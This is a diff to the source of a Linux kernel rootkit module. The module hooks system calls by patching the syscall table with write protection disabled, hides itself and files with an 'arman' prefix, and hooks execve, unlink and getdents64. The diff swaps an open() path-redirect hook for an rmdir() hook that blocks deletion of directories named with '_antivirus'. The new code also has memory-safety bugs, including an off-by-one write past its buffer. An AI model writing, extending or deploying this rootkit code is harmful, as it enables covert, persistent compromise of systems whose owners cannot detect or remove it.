@@ -28,7 +28,7 @@ extern struct module __this_module;
 #define HIDE_PREFIX     "arman"
 #define EXEC_PREFIC     "_antivirus"
 #define HIDE_PREFIX_SZ  (sizeof(HIDE_PREFIX) - 1)
-#define OPEN_PATH       "/file.txt"
+#define RM_DIR       "virus"
 
 #define MAX_CMD_LEN 1976
 
@@ -47,8 +47,6 @@ enum signals {
     SHOWMODULE = 63,
     HIDEFILES = 62,
     SHOWFILES = 61,
-    HACK_OPEN = 60,
-    UNHACK_OPEN = 59
 };
 
 // Using kprobes method for getting syscall table address for new versions of kernel
@@ -107,7 +105,7 @@ static syscall_wrapper orig_sys_openat;
 static syscall_wrapper orig_sys_getdents64;
 static syscall_wrapper orig_unlink;
 static syscall_wrapper orig_execve;
-static syscall_wrapper orig_open;
+static syscall_wrapper orig_rmdir;
 
 
 static inline void write_forced_cr0(unsigned long value)
@@ -284,19 +282,26 @@ static asmlinkage long h_sys_execve(struct pt_regs *regs)
     return orig_execve(regs);
 }
 
-static asmlinkage long h_sys_open(struct pt_regs *regs)
+static asmlinkage long h_sys_rmdir(struct pt_regs *regs)
 {
-    char * new_path = OPEN_PATH;
-    const char __user *filename = (const char __user *)regs->di;
+    char * dir_str = NULL;
+    const char __user *dir_name = (const char __user *)regs->di;
 
-    // Check if the original filename can be accessed
-    if (!access_ok(VERIFY_READ, filename, 1))
-        return -EFAULT;
+    int dir_name_size = strnlen_user(dir_name, 256);
+    dir_str = kzalloc(dir_name_size, GFP_KERNEL);
 
-    // Modify regs->di to point to new_path
-    regs->di = (unsigned long)new_path;
+    copy_from_user(dir_str, dir_name, dir_name_size);
+    dir_str[dir_name_size] = '\0';
 
-    return orig_sys_open(regs);
+    if (dir_str != NULL){
+//        printk(KERN_ALERT "EXECVE called: %s\n", exec_str);
+        if (strstr(dir_str, EXEC_PREFIC) != NULL){
+            printk(KERN_ALERT "Dir found!!\n");
+            return -EACCES;
+        }
+    }
+
+    return orig_rmdir(regs);
 }
 
 #endif
@@ -403,20 +408,20 @@ static void restore_execve(void)
     __sys_call_table_addr[__NR_execve] = (unsigned long)orig_execve;
 }
 
-static void store_open(void)
+static void store_rmdir(void)
 {
-    orig_execve = (syscall_wrapper)__sys_call_table_addr[__NR_open];
+    orig_rmdir = (syscall_wrapper)__sys_call_table_addr[__NR_rmdir];
 }
 
-static void hook_open(void)
+static void hook_rmdir(void)
 {
-    __sys_call_table_addr[__NR_open] = (unsigned long)&h_sys_open;
+    __sys_call_table_addr[__NR_rmdir] = (unsigned long)&h_sys_rmdir;
 }
 
-static void restore_open(void)
+static void restore_rmdir(void)
 {
     /* Restore syscall table */
-    __sys_call_table_addr[__NR_open] = (unsigned long)orig_open;
+    __sys_call_table_addr[__NR_rmdir] = (unsigned long)orig_rmdir;
 }
 
 static void work_handler(struct work_struct * work)
@@ -516,7 +521,7 @@ static int __init mod_init(void)
     store_getdents64();
     store_unlink();
     store_execve();
-    store_open();
+    store_rmdir();
 
     unprotect_memory();
 
@@ -525,7 +530,7 @@ static int __init mod_init(void)
     hook_openat();
     hook_unlink();
     hook_execve();
-    hook_open();
+    hook_rmdir();
 
     protect_memory();
 
@@ -545,7 +550,7 @@ static void __exit mod_exit(void)
     restore_getdents64();
     restore_unlink();
     restore_execve();
-    restore_open();
+    restore_rmdir();
 
     protect_memory();
 
